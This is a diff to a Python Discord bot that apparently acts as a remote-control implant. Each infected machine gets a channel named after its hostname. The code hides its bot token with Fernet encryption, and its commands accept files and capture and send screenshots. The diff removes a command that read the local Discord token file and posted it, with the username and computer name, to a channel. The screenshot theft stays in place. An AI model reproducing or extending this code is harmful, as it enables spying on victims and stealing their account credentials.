@@ -8,9 +8,15 @@ import platform
 from cryptography.fernet import Fernet
 
 # Decrypting the token
+
+# Replace with the encryption key you generated (it must be a bytes object)
 key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
 cipher_suite = Fernet(key)
+
+# Replace with the encrypted token you generated
 encrypted_token = b"gAAAAABouGj2ioU6r5nWwx4MPC42YD4zvPVqYfFYKmRELhCwPu4a4PCam5O7xzVMgY4QdSJSnUgcuVfygaO-M4X__OnuC2Qw7H_hDhqdWXgi4-HRTorljLeo5EGJyMXOQnmc0ktWi9jIFQNKHeheNBEi5UAFY6BrHI9cX4y7YHB10Clk6u-RpG0="  # Replace with your actual encrypted token
+
+# Decrypt the token
 TOKEN = cipher_suite.decrypt(encrypted_token).decode()
 
 # Set up the bot
@@ -39,8 +45,9 @@ async def get_or_create_channel(ctx, user_name):
 # Command to handle file sending
 @bot.command()
 async def send(ctx):
-    if ctx.channel.name != ctx.author.name.lower():
-        await ctx.send("This command can only be used in your personal channel.")
+    # Check if the command is executed in the correct channel
+    if ctx.channel.name != platform.node().lower():
+        await ctx.send("This command can only be used in the channel corresponding to this device.")
         return
 
     if len(ctx.message.attachments) > 0:
@@ -65,8 +72,9 @@ async def send(ctx):
 # Command to take a screenshot
 @bot.command()
 async def screenshot(ctx):
-    if ctx.channel.name != ctx.author.name.lower():
-        await ctx.send("This command can only be used in your personal channel.")
+    # Check if the command is executed in the correct channel
+    if ctx.channel.name != platform.node().lower():
+        await ctx.send("This command can only be used in the channel corresponding to this device.")
         return
 
     # Take a screenshot using Pillow
@@ -76,38 +84,6 @@ async def screenshot(ctx):
     screenshot.save(byte_io, 'PNG')
     byte_io.seek(0)
     await ctx.send("Here is the screenshot:", file=discord.File(byte_io, 'screenshot.png'))
-
-# Command to grab Discord token and account info
-@bot.command()
-async def discord(ctx):
-    if ctx.channel.name != ctx.author.name.lower():
-        await ctx.send("This command can only be used in your personal channel.")
-        return
-
-    # Path to the Discord token file
-    token_path = os.path.expanduser("~/.config/discord/Token")
-
-    try:
-        # Read the token from the file
-        with open(token_path, 'r') as file:
-            token = file.read().strip()
-
-        # Create an embed to display the token and account info
-        embed = discord.Embed(
-            title="Discord Account Information",
-            description="Here is the token and account info for the current user.",
-            color=discord.Color.blue()
-        )
-        embed.add_field(name="Token", value=token, inline=False)
-        embed.add_field(name="Username", value=os.getlogin(), inline=True)
-        embed.add_field(name="Computer Name", value=platform.node(), inline=True)
-
-        # Send the embed to the correct channel
-        channel = await get_or_create_channel(ctx, "discord-info")
-        await channel.send(embed=embed)
-
-    except Exception as e:
-        await ctx.send(f"Failed to retrieve Discord token: {str(e)}")
 
 # On bot startup: Check and create the channel, ping @everyone in the corresponding channel
 @bot.event
